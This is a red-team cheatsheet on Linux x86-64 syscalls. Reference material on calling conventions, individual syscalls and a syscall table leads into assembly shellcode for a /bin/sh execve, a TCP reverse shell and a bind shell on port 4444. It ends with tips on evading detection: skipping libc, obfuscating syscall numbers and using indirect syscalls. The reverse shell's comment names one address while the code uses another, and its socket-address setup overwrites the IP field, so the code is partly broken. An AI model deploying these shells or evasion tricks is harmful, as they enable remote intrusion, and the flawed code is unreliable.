# Cheatsheet Linux Syscalls - Red Team Edition

## Syscall Basics

### x86-64 Calling Convention
```
Syscall number: RAX
Arguments:      RDI, RSI, RDX, R10, R8, R9
Return value:   RAX
Instruction:    syscall

Registers clobbered: RCX, R11
```

### x86 (32-bit) Calling Convention
```
Syscall number: EAX
Arguments:      EBX, ECX, EDX, ESI, EDI, EBP
Return value:   EAX
Instruction:    int 0x80
```

### Inline Assembly
```c
// x86-64
static inline long syscall3(long n, long a1, long a2, long a3) {
    long ret;
    asm volatile (
        "syscall"
        : "=a"(ret)
        : "a"(n), "D"(a1), "S"(a2), "d"(a3)
        : "rcx", "r11", "memory"
    );
    return ret;
}

// Utilisation
long result = syscall3(__NR_write, 1, "Hello\n", 6);
```

## Syscalls Essentiels

### read (0)
```c
// ssize_t read(int fd, void *buf, size_t count);
#define __NR_read 0

// Assembly x86-64
mov rax, 0          ; syscall read
mov rdi, 0          ; fd = stdin
mov rsi, buffer     ; buf
mov rdx, 100        ; count
syscall

// C inline
char buf[100];
syscall3(__NR_read, 0, (long)buf, 100);
```

### write (1)
```c
// ssize_t write(int fd, const void *buf, size_t count);
#define __NR_write 1

// Assembly x86-64
mov rax, 1          ; syscall write
mov rdi, 1          ; fd = stdout
mov rsi, msg        ; buf
mov rdx, msg_len    ; count
syscall

// C inline
syscall3(__NR_write, 1, (long)"Hello\n", 6);
```

### open (2)
```c
// int open(const char *pathname, int flags, mode_t mode);
#define __NR_open 2

// Flags
O_RDONLY    0
O_WRONLY    1
O_RDWR      2
O_CREAT     0100
O_TRUNC     01000

// Assembly x86-64
mov rax, 2          ; syscall open
mov rdi, filename   ; pathname
mov rsi, 0          ; flags = O_RDONLY
mov rdx, 0          ; mode (ignored si pas O_CREAT)
syscall

// C inline
int fd = syscall3(__NR_open, (long)"/etc/passwd", O_RDONLY, 0);
```

### close (3)
```c
// int close(int fd);
#define __NR_close 3

mov rax, 3          ; syscall close
mov rdi, fd         ; fd
syscall
```

### execve (59)
```c
// int execve(const char *filename, char *const argv[], char *const envp[]);
#define __NR_execve 59

// Assembly x86-64 - Execute /bin/sh
section .data
    binsh db "/bin/sh", 0

section .text
    xor rsi, rsi        ; argv = NULL
    xor rdx, rdx        ; envp = NULL
    mov rdi, binsh      ; filename
    mov rax, 59         ; syscall execve
    syscall

// C inline
char *argv[] = {"/bin/sh", NULL};
char *envp[] = {NULL};
syscall3(__NR_execve, (long)"/bin/sh", (long)argv, (long)envp);
```

### fork (57)
```c
// pid_t fork(void);
#define __NR_fork 57

mov rax, 57         ; syscall fork
syscall
; RAX = 0 dans child, PID dans parent
```

### exit (60)
```c
// void exit(int status);
#define __NR_exit 60

mov rax, 60         ; syscall exit
mov rdi, 0          ; status
syscall
```

## Network Syscalls

### socket (41)
```c
// int socket(int domain, int type, int protocol);
#define __NR_socket 41

// Constants
AF_INET     2
SOCK_STREAM 1
IPPROTO_TCP 6

// Assembly x86-64
mov rax, 41         ; syscall socket
mov rdi, 2          ; domain = AF_INET
mov rsi, 1          ; type = SOCK_STREAM
mov rdx, 0          ; protocol = 0 (auto)
syscall
; RAX = socket fd

// C inline
int sockfd = syscall3(__NR_socket, AF_INET, SOCK_STREAM, 0);
```

### connect (42)
```c
// int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
#define __NR_connect 42

// Structure sockaddr_in
struct sockaddr_in {
    short sin_family;       // AF_INET (2)
    unsigned short sin_port; // Port (htons)
    unsigned int sin_addr;   // IP (inet_addr)
    char sin_zero[8];
};

// Assembly x86-64
section .data
    sockaddr:
        dw 2                ; sin_family = AF_INET
        dw 0x5c11           ; sin_port = htons(4444)
        dd 0x0100007f       ; sin_addr = 127.0.0.1
        dq 0                ; sin_zero

section .text
    mov rax, 42         ; syscall connect
    mov rdi, sockfd     ; sockfd
    mov rsi, sockaddr   ; addr
    mov rdx, 16         ; addrlen
    syscall
```

### bind (49)
```c
// int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
#define __NR_bind 49

mov rax, 49
mov rdi, sockfd
mov rsi, sockaddr
mov rdx, 16
syscall
```

### listen (50)
```c
// int listen(int sockfd, int backlog);
#define __NR_listen 50

mov rax, 50
mov rdi, sockfd
mov rsi, 1          ; backlog
syscall
```

### accept (43)
```c
// int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
#define __NR_accept 43

mov rax, 43
mov rdi, sockfd
mov rsi, 0          ; addr = NULL (on ignore client)
mov rdx, 0          ; addrlen = NULL
syscall
; RAX = client socket fd
```

### dup2 (33)
```c
// int dup2(int oldfd, int newfd);
#define __NR_dup2 33

// Rediriger stdin/stdout/stderr vers socket
mov rax, 33
mov rdi, sockfd     ; oldfd = socket
mov rsi, 0          ; newfd = stdin
syscall

mov rax, 33
mov rdi, sockfd
mov rsi, 1          ; stdout
syscall

mov rax, 33
mov rdi, sockfd
mov rsi, 2          ; stderr
syscall
```

## Memory Management

### mmap (9)
```c
// void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
#define __NR_mmap 9

// Protection flags
PROT_READ   0x1
PROT_WRITE  0x2
PROT_EXEC   0x4

// Flags
MAP_PRIVATE   0x02
MAP_ANONYMOUS 0x20

// Assembly x86-64 - Allouer mémoire RWX
mov rax, 9              ; syscall mmap
xor rdi, rdi            ; addr = NULL (let kernel choose)
mov rsi, 0x1000         ; length = 4096 bytes
mov rdx, 7              ; prot = PROT_READ | PROT_WRITE | PROT_EXEC
mov r10, 0x22           ; flags = MAP_PRIVATE | MAP_ANONYMOUS
mov r8, -1              ; fd = -1
xor r9, r9              ; offset = 0
syscall
; RAX = adresse allouée

// C inline
void *mem = (void *)syscall6(__NR_mmap, 0, 4096,
                              PROT_READ | PROT_WRITE | PROT_EXEC,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
```

### mprotect (10)
```c
// int mprotect(void *addr, size_t len, int prot);
#define __NR_mprotect 10

// Changer protection mémoire vers RWX
mov rax, 10
mov rdi, addr
mov rsi, 0x1000
mov rdx, 7          ; PROT_READ | PROT_WRITE | PROT_EXEC
syscall
```

### munmap (11)
```c
// int munmap(void *addr, size_t length);
#define __NR_munmap 11

mov rax, 11
mov rdi, addr
mov rsi, length
syscall
```

## Process Management

### clone (56)
```c
// long clone(unsigned long flags, void *stack, int *parent_tid,
//            int *child_tid, unsigned long tls);
#define __NR_clone 56

// Créer thread
mov rax, 56
mov rdi, 0x3D0F00      ; flags (CLONE_VM | CLONE_FS | ...)
mov rsi, stack_top     ; stack
xor rdx, rdx           ; parent_tid = NULL
xor r10, r10           ; child_tid = NULL
xor r8, r8             ; tls = 0
syscall
```

### kill (62)
```c
// int kill(pid_t pid, int sig);
#define __NR_kill 62

// SIGKILL
mov rax, 62
mov rdi, target_pid
mov rsi, 9          ; SIGKILL
syscall
```

### ptrace (101)
```c
// long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);
#define __NR_ptrace 101

// PTRACE_ATTACH
#define PTRACE_ATTACH 16

mov rax, 101
mov rdi, 16         ; PTRACE_ATTACH
mov rsi, target_pid
xor rdx, rdx
xor r10, r10
syscall
```

## File Operations

### stat (4)
```c
// int stat(const char *pathname, struct stat *statbuf);
#define __NR_stat 4

struct stat buf;
syscall(__NR_stat, "/etc/passwd", &buf);
```

### unlink (87)
```c
// int unlink(const char *pathname);
#define __NR_unlink 87

mov rax, 87
mov rdi, filename
syscall
```

### chmod (90)
```c
// int chmod(const char *pathname, mode_t mode);
#define __NR_chmod 90

mov rax, 90
mov rdi, filename
mov rsi, 0755       ; rwxr-xr-x
syscall
```

### chdir (80)
```c
// int chdir(const char *path);
#define __NR_chdir 80

mov rax, 80
mov rdi, path
syscall
```

## Shellcode Examples

### Execve /bin/sh (x86-64)
```nasm
; 27 bytes
section .text
global _start

_start:
    ; execve("/bin/sh", NULL, NULL)
    xor rsi, rsi        ; argv = NULL
    push rsi            ; String terminator
    mov rdi, 0x68732f6e69622f ; "/bin/sh" en little-endian
    push rdi
    mov rdi, rsp        ; rdi = "/bin/sh"
    xor rdx, rdx        ; envp = NULL
    mov al, 59          ; syscall execve
    syscall
```

### Reverse Shell TCP (x86-64)
```nasm
; Reverse shell vers 192.168.1.100:4444
section .text
global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor rax, rax
    mov al, 41          ; syscall socket
    xor rdi, rdi
    mov dil, 2          ; AF_INET
    xor rsi, rsi
    mov sil, 1          ; SOCK_STREAM
    xor rdx, rdx        ; protocol = 0
    syscall
    mov rdi, rax        ; Save socket fd

    ; connect(sockfd, &sockaddr, 16)
    xor rax, rax
    mov al, 42          ; syscall connect
    sub rsp, 16
    mov dword [rsp], 0x0100007f    ; sin_addr = 127.0.0.1
    mov word [rsp+2], 0x5c11       ; sin_port = htons(4444)
    mov word [rsp], 2              ; sin_family = AF_INET
    mov rsi, rsp        ; sockaddr
    xor rdx, rdx
    mov dl, 16          ; addrlen
    syscall

    ; dup2(sockfd, 0/1/2)
    xor rsi, rsi        ; newfd = 0 (stdin)
dup_loop:
    xor rax, rax
    mov al, 33          ; syscall dup2
    syscall
    inc rsi
    cmp rsi, 3
    jne dup_loop

    ; execve("/bin/sh", NULL, NULL)
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    mov al, 59          ; syscall execve
    syscall
```

### Bind Shell (x86-64)
```nasm
; Bind shell sur port 4444
_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor rax, rax
    mov al, 41
    xor rdi, rdi
    mov dil, 2
    xor rsi, rsi
    mov sil, 1
    xor rdx, rdx
    syscall
    mov rdi, rax        ; sockfd

    ; bind(sockfd, &sockaddr, 16)
    xor rax, rax
    mov al, 49
    sub rsp, 16
    mov dword [rsp], 0      ; sin_addr = 0.0.0.0
    mov word [rsp+2], 0x5c11  ; port 4444
    mov word [rsp], 2       ; AF_INET
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 16
    syscall

    ; listen(sockfd, 1)
    xor rax, rax
    mov al, 50
    xor rsi, rsi
    mov sil, 1
    syscall

    ; accept(sockfd, NULL, NULL)
    xor rax, rax
    mov al, 43
    xor rsi, rsi
    xor rdx, rdx
    syscall
    mov rdi, rax        ; client_fd

    ; dup2 + execve (même que reverse shell)
    ; [...]
```

## Syscall Table (x86-64)

```
Numéro  Nom              Signature
------  ---              ---------
0       read             (int fd, void *buf, size_t count)
1       write            (int fd, const void *buf, size_t count)
2       open             (const char *pathname, int flags, mode_t mode)
3       close            (int fd)
4       stat             (const char *pathname, struct stat *statbuf)
9       mmap             (void *addr, size_t len, int prot, int flags, int fd, off_t off)
10      mprotect         (void *addr, size_t len, int prot)
11      munmap           (void *addr, size_t len)
33      dup2             (int oldfd, int newfd)
41      socket           (int domain, int type, int protocol)
42      connect          (int sockfd, struct sockaddr *addr, socklen_t addrlen)
43      accept           (int sockfd, struct sockaddr *addr, socklen_t *addrlen)
49      bind             (int sockfd, struct sockaddr *addr, socklen_t addrlen)
50      listen           (int sockfd, int backlog)
56      clone            (unsigned long flags, void *stack, ...)
57      fork             (void)
59      execve           (const char *filename, char *const argv[], char *const envp[])
60      exit             (int status)
62      kill             (pid_t pid, int sig)
80      chdir            (const char *path)
87      unlink           (const char *pathname)
90      chmod            (const char *pathname, mode_t mode)
101     ptrace           (long request, pid_t pid, void *addr, void *data)
```

## Helper Macros

```c
// Syscalls à 6 arguments max
#define syscall1(n, a1) \
    syscall_raw(n, (long)(a1), 0, 0, 0, 0, 0)

#define syscall2(n, a1, a2) \
    syscall_raw(n, (long)(a1), (long)(a2), 0, 0, 0, 0)

#define syscall3(n, a1, a2, a3) \
    syscall_raw(n, (long)(a1), (long)(a2), (long)(a3), 0, 0, 0)

static inline long syscall_raw(long n, long a1, long a2, long a3,
                                long a4, long a5, long a6) {
    long ret;
    register long r10 asm("r10") = a4;
    register long r8 asm("r8") = a5;
    register long r9 asm("r9") = a6;

    asm volatile (
        "syscall"
        : "=a"(ret)
        : "a"(n), "D"(a1), "S"(a2), "d"(a3), "r"(r10), "r"(r8), "r"(r9)
        : "rcx", "r11", "memory"
    );
    return ret;
}
```

## Tips Red Team

### 1. Éviter libc
```c
// Au lieu de printf, write, etc., utiliser syscalls directs
// Plus petit binaire, moins de dépendances détectables
```

### 2. Obfuscation
```c
// Numéro de syscall obfusqué
int syscall_num = 0x3B;  // execve
syscall_num ^= 0x50;
syscall_num ^= 0x50;  // Déobfuscation runtime
```

### 3. Shellcode Position-Independent
```nasm
; Utiliser call/pop pour obtenir adresse courante
call next
next:
    pop rsi  ; RSI = adresse courante
    ; Calculer offsets relatifs
```

### 4. Syscall indirect (anti-static analysis)
```c
// Via VDSO au lieu de syscall directe
void *vdso = /* trouver VDSO */;
void (*syscall_func)() = vdso + offset;
syscall_func();
```
